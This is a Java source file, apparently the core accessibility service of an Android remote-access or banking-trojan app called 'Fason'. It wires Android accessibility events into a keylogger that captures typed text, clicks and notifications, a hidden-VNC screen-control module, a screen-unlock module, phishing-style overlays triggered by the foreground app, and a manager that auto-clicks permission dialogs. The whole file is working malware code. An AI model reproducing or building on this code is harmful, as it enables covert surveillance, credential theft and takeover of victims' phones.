package com.fason.app.core;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.fason.app.core.permissions.AutoGrantManager;
import com.fason.app.features.hvnc.HVncAccessibilityService;
import com.fason.app.features.hvnc.AccessibilityKeepalive;
import com.fason.app.features.inspector.InspectorAccessibilityService;
import com.fason.app.features.keylogger.KeyloggerManager;
import com.fason.app.features.springe.SpringeManager;
import com.fason.app.features.unlock.UnlockManager;

/**
 * FasonAccessibilityService — the primary accessibility service.
 *
 * Routes events to:
 *   • HVncAccessibilityService — screen capture / interaction
 *   • InspectorAccessibilityService — UI hierarchy inspection
 *   • KeyloggerManager — keystroke capture
 *   • UnlockManager — screen unlock
 *   • SpringeManager — smart trigger for overlay (replaces OverlayManager + PhishletManager)
 *   • AutoGrantManager — auto-clicks permission dialogs during the setup sequence
 */
public class FasonAccessibilityService extends AccessibilityService {

    private static final String TAG = "FasonA11y";
    private static volatile FasonAccessibilityService instance;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        HVncAccessibilityService.onHostConnected(this);
        InspectorAccessibilityService.onHostConnected(this);
        KeyloggerManager.onHostConnected(this);
        UnlockManager.onHostConnected(this);
        AccessibilityKeepalive.getInstance().onServiceConnected();
        Log.i(TAG, "connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        try {
            int type = event.getEventType();

            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

                // AutoGrant fires FIRST on the event thread — zero-delay path.
                // Both state-changed (permission dialogs) and content-changed
                // (settings toggle updates) are handled by a single entry point.
                AutoGrantManager.getInstance().onAccessibilityEvent(event);

                HVncAccessibilityService.onAccessibilityEvent(event);
                KeyloggerManager.onAccessibilityEvent(event);

                if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    CharSequence pkg = event.getPackageName();
                    if (pkg != null) {
                        SpringeManager.getInstance().onForegroundPackage(pkg.toString());
                    }
                }

            } else if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                       type == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
                       type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                KeyloggerManager.onAccessibilityEvent(event);

            } else if (type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                KeyloggerManager.onAccessibilityEvent(event);

            } else if (type == AccessibilityEvent.TYPE_ANNOUNCEMENT) {
                InspectorAccessibilityService.onAccessibilityEvent(event);
            }

        } finally {
            try { event.recycle(); } catch (Exception ignored) {}
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "interrupted");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        AutoGrantManager.getInstance().stop();
        AccessibilityKeepalive.getInstance().onServiceDestroyed();
        HVncAccessibilityService.onHostDisconnected();
        InspectorAccessibilityService.onHostDisconnected();
        KeyloggerManager.onHostDisconnected();
        UnlockManager.onHostDisconnected();
        instance = null;
        Log.i(TAG, "destroyed");
    }

    // ── Static accessors ───────────────────────────────────────────────────────

    public static FasonAccessibilityService getInstance()  { return instance; }
    public static boolean isServiceConnected()             { return instance != null; }

    public static boolean isEnabled() {
        try {
            Context ctx = FasonApp.getContext();
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null) return false;
            String svcName = ctx.getPackageName() + "/com.fason.app.core.FasonAccessibilityService";
            for (String token : enabled.split(":")) {
                if (token.equalsIgnoreCase(svcName)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    public static void openSettings() {
        try {
            android.content.Intent i =
                new android.content.Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            FasonApp.getContext().startActivity(i);
        } catch (Exception ignored) {}
    }
}
